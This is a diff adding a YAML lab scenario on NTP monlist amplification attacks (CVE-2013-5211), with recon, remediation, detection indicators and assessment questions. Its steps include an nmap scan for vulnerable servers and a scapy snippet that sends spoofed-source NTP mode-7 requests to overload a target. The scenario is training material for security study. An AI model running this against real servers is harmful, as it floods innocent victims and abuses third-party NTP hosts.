@@ -1,0 +1,93 @@
+# Category: DDoS & DoS
+name: "NTP Amplification Attack – Monlist Request"
+id: "ddos-ntp-amplification-001"
+category: "ddos"
+subcategory: "amplification"
+difficulty: "intermediate"
+estimated_time: "50 minutes"
+
+description: |
+  Exploit the NTP monlist (or ntpdc) command to amplify traffic. A small
+  request to an NTP server with a spoofed victim IP can generate a large
+  response, often with amplification factors of 200x or more.
+
+learning_objectives:
+  - Understand NTP monlist vulnerability (CVE-2013-5211)
+  - Find vulnerable NTP servers
+  - Craft spoofed NTP queries with scapy
+  - Execute a test attack
+
+tools:
+  - scapy
+  - ntpq (to test)
+  - nmap (for service detection)
+
+prerequisites:
+  - Authorized environment for testing
+  - NTP servers that still support monlist
+
+steps:
+  - id: "step1"
+    phase: "recon"
+    action: "Identify NTP servers allowing monlist"
+    commands:
+      - "# Use nmap script"
+      - "nmap -sU -p 123 --script ntp-monlist <TARGET>"
+    expected_output: "List of servers that respond to monlist"
+    detection: "NTP server logs may show monlist queries"
+
+  - id: "step2"
+    phase: "craft_attack"
+    action: "Send monlist request with spoofed IP"
+    commands:
+      - "# Scapy"
+      - "from scapy.all import *"
+      - "pkt = IP(src=target, dst=server)/UDP(dport=123)/NTP(mode=7, version=2)"
+      - "send(pkt)"
+    expected_output: "Large monlist response sent to target"
+    detection: "Network traffic spike"
+
+  - id: "step3"
+    phase: "impact"
+    action: "Monitor target for bandwidth saturation"
+    expected_output: "Target overloaded"
+    detection: "DDoS detection"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1498"
+    description: "Network Denial of Service"
+  - standard: "CIS NTP Benchmarks"
+    control: "3.1"
+    description: "Disable NTP monlist"
+
+detection:
+  network_indicators:
+    - "UDP traffic to port 123 with spoofed IPs"
+  log_indicators:
+    - "NTP logs showing monlist requests"
+  endpoint_indicators:
+    - "scapy"
+
+remediation:
+  immediate:
+    - "Patch NTP servers to disable monlist (or upgrade to newer versions)"
+    - "Use iptables to restrict NTP queries"
+  long_term:
+    - "Implement rate limiting for NTP"
+    - "Monitor NTP server usage"
+
+variables:
+  target_ip: "10.0.0.1"
+  ntp_server: "time.example.com"
+
+assessment_questions:
+  - "What CVE corresponds to the NTP monlist vulnerability?"
+  - "How does NTP amplification compare to DNS amplification?"
+  - "What is the recommended mitigation for NTP amplification?"
+
+references:
+  - url: "https://www.us-cert.gov/ncas/alerts/TA14-013A"
+    title: "NTP Amplification"
+  - url: "https://scapy.readthedocs.io/"
+    title: "Scapy"
